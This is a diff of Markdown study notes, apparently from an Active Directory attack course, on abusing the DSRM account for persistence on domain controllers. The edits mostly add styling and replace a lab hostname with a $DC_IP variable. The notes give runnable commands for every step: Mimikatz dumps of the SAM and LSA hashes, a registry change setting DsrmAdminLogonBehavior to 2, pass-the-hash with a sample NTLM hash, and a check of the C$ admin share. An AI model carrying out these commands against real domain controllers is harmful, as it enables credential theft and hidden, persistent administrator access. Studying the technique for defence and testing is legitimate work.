@@ -2,32 +2,38 @@
 
 **Directory Services Restore Mode** is a **special local administrator account** on every Domain Controller used for disaster recovery when Active Directory won't start.
 
+> [!danger] DSRM as a Persistence Backdoor
 > _"DSRM is a special local administrator account that exists on every Domain Controller, primarily used for recovery."_
 
-### The Problem (By Default)
+### <span style="color:#50FA7B">The Problem (By Default)</span>
 
+> [!info] Default Behavior
 > DSRM account **cannot log in** when DC is running normally — only works in Safe Mode/Recovery Mode.
 
 **Solution**: Modify registry to allow DSRM login anytime.
 
 ___
 
-# Step 1: Dump DSRM Password Hash
+# <span style="color:#FF5555">Step 1: Dump DSRM Password Hash</span>
+
+> [!info] Variables used below
+> - `$DC_IP` – Domain Controller's IP
 
 ```powershell
 # Get the local SAM database (where DSRM password lives)
-Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' -ComputerName dcorp-dc
+Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' -ComputerName $DC_IP
 
 # Administrator:500:aad3b435...:a102ad5753f4c441e3af31c97fad86fd:::
 # This is the **DSRM local admin** hash (not domain admin!)
 ```
-### Compare with Domain Admin
+### <span style="color:#50FA7B">Compare with Domain Admin</span>
 
 ```powershell
 # Dump LSA (contains domain account hashes)
-Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -ComputerName dcorp-dc
+Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -ComputerName $DC_IP
 ```
 
+> [!info] Hash Source Clarification
 >_"The Administrator hash from lsadump::sam is the DSRM local admin. The other is the domain Administrator."_
 
 | Source                | What it is                                |
@@ -36,7 +42,7 @@ Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -ComputerName dcorp-dc
 | `lsadump::lsa /patch` | **Domain** Administrator (AD database)    |
 
 ___
-## Step 2: Enable DSRM Logon (Critical Registry Change)
+## <span style="color:#8BE9FD">Step 2: Enable DSRM Logon (Critical Registry Change)</span>
 
 **By default:** DSRM account cannot logon when DC is online
 
@@ -44,7 +50,7 @@ ___
 
 ```powershell
 # Connect to DC
-Enter-PSSession -ComputerName dcorp-dc
+Enter-PSSession -ComputerName $DC_IP
 
 # Enable DSRM logon
 New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD
@@ -57,19 +63,19 @@ New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DsrmA
 |`2`|DSRM can logon **ANYTIME** (even online)|
 
 ___
-## Step 3: Pass-the-Hash with DSRM
+## <span style="color:#8BE9FD">Step 3: Pass-the-Hash with DSRM</span>
 
 Now use the DSRM hash to authenticate as local Administrator:
 
 ```powershell
 # Pass-the-hash using DSRM account
-Invoke-Mimikatz -Command '"sekurlsa::pth /domain:dcorp-dc /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:powershell.exe"'
+Invoke-Mimikatz -Command '"sekurlsa::pth /domain:$DC_IP /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:powershell.exe"'
 ```
 
-**Important:** Use `/domain:dcorp-dc` (the computer name), NOT the domain name!
+**Important:** Use `/domain:$DC_IP` (the computer name), ==NOT the domain name==!
 
 Then verify access:
 
 ```bash
-ls \\dcorp-dc\C$
+ls \\$DC_IP\C$
 ```
